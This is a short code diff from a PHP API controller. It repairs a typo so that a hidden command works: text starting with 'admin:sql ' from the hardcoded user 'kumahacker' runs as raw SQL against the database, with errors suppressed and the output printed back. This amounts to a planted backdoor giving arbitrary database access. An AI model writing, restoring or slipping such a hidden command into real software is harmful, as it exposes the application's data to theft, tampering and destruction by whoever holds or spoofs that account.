@@ -594,7 +594,7 @@ class ApiController extends Controller {
         }
 
         if (stripos($text,"admin:sql ") === 0 && $username === 'kumahacker') {
-          $sql = trim(ubstr($text, stripos($text,' ')));
+          $sql = trim(substr($text, stripos($text,' ')));
 
           $result = @Connection::query($sql);
           $output = '<pre>';
